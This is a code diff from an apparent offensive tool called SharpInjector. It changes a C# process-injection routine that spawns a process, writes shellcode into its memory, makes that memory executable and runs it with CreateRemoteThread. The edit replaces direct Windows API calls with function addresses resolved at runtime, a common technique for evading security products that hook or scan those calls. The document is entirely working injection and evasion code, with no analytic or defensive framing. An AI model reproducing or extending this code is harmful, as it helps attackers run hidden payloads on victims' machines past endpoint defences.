@@ -61,28 +61,38 @@ namespace SharpInjector
             Console.WriteLine($"[*] Spwaned new instance of {ProgramPath} (pid: {ProcessInfo.dwProcessId})");
             Process Target = Process.GetProcessById((int)ProcessInfo.dwProcessId);
 
+
             Console.WriteLine("[*] Allocating shellcode...");
-            IntPtr Address = WinAPI.VirtualAllocEx(Target.Handle, IntPtr.Zero, Shellcode.Length, WinAPI.MEM_COMMIT, WinAPI.PAGE_READWRITE);
+            IntPtr pVirtualAllocEx = reprobate.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
+            WinAPI.VirtualAllocEx VirtualAllocEx = Marshal.GetDelegateForFunctionPointer(pVirtualAllocEx, typeof(WinAPI.VirtualAllocEx)) as WinAPI.VirtualAllocEx;
+            IntPtr Address = VirtualAllocEx(Target.Handle, IntPtr.Zero, Shellcode.Length, WinAPI.MEM_COMMIT, WinAPI.PAGE_READWRITE);
             if (Address == IntPtr.Zero)
             {
                 WinAPI.TerminateProcess(ProcessInfo.hProcess, 0);
                 return;
             }
 
-            if (!WinAPI.WriteProcessMemory(ProcessInfo.hProcess, Address, Shellcode, Shellcode.Length, out bytesWritten))
+            IntPtr pWriteProcessMemory = reprobate.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
+            WinAPI.WriteProcessMemory WriteProcessMemory = Marshal.GetDelegateForFunctionPointer(pWriteProcessMemory, typeof(WinAPI.WriteProcessMemory)) as WinAPI.WriteProcessMemory;
+            if (!WriteProcessMemory(ProcessInfo.hProcess, Address, Shellcode, Shellcode.Length, out bytesWritten))
             {
                 WinAPI.Clean(ProcessInfo.hProcess, Address, Shellcode.Length);
                 return;
             }
 
-            if (!WinAPI.VirtualProtectEx(ProcessInfo.hProcess, Address, Shellcode.Length, WinAPI.PAGE_EXECUTE_READ, out uint OldProtect))
+
+            IntPtr pVirtualProtectEx = reprobate.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
+            WinAPI.VirtualProtectEx VirtualProtectEx = Marshal.GetDelegateForFunctionPointer(pVirtualProtectEx, typeof(WinAPI.VirtualProtectEx)) as WinAPI.VirtualProtectEx;
+            if (!VirtualProtectEx(ProcessInfo.hProcess, Address, Shellcode.Length, WinAPI.PAGE_EXECUTE_READ, out uint OldProtect))
             {
                 WinAPI.Clean(ProcessInfo.hProcess, Address, Shellcode.Length);
                 return;
             }
 
             Console.WriteLine("[*] Calling CreateRemoteThread...");
-            IntPtr hThread = WinAPI.CreateRemoteThread(ProcessInfo.hProcess, IntPtr.Zero, 0, Address, IntPtr.Zero, 0, IntPtr.Zero);
+            IntPtr pCreateRemoteThread = reprobate.GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
+            WinAPI.CreateRemoteThread CreateRemoteThread = Marshal.GetDelegateForFunctionPointer(pCreateRemoteThread, typeof(WinAPI.CreateRemoteThread)) as WinAPI.CreateRemoteThread;
+            IntPtr hThread = CreateRemoteThread(ProcessInfo.hProcess, IntPtr.Zero, 0, Address, IntPtr.Zero, 0, IntPtr.Zero);
             if (hThread == IntPtr.Zero)
             {
                 WinAPI.Clean(ProcessInfo.hProcess, Address, Shellcode.Length);
